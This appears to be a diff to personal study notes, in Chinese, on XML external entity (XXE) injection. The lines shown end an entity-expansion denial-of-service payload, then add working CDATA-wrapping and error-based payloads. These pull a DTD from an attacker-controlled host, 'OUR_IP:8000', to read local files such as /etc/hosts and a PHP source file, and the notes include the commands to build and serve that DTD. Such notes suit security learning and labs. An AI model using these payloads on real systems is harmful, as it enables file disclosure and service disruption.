@@ -120,3 +120,36 @@ Injection:
     <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
     <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
   ]>
+
+
+CDATA:
+  如果要读取的 submitDetails.php 文件中包含 XML 的特殊字符（比如 <、>、& 等），XML 解析器直接读取它时会误以为这是 XML 标签，导致解析器崩溃报错，
+  把文件内容塞进 <![CDATA[ 文件的真实内容 ]]> 中，XML 解析器就会把里面的内容纯粹当成“普通字符串”处理，不会去解析里面的 < 或 >，从而能完整地把 PHP 源码回显。
+
+  echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+  
+  <!DOCTYPE email [
+    <!ENTITY % begin "<![CDATA["> <!-- 前置 CDATA 标签的起始部分 -->
+    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- 引用外部文件 -->
+    <!ENTITY % end "]]>"> <!-- 追加 CDATA 标签的结束部分 -->
+    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- 引用我们的外部 DTD -->
+    %xxe;
+  ]>
+  ...
+  <email>&joined;</email> <!-- 引用 &joined; 实体以打印文件内容 -->
+
+
+  error base：
+    “借用”了定义 content 实体这一动作，把 SYSTEM '%nonExistingEntity;/%file;' 塞进它的定义里。这样既符合 XML 的语法规则能被顺利解析，又达到了“让解析器去读取非法路径并报错”的目的。
+
+    echo '<!ENTITY % file SYSTEM "file:///etc/hosts">  <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">' > xxe.dtd
+
+    python3 -m http.server 8000
+
+    <!DOCTYPE email [ 
+    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+      %remote;
+      %error;
+    ]>
+
+
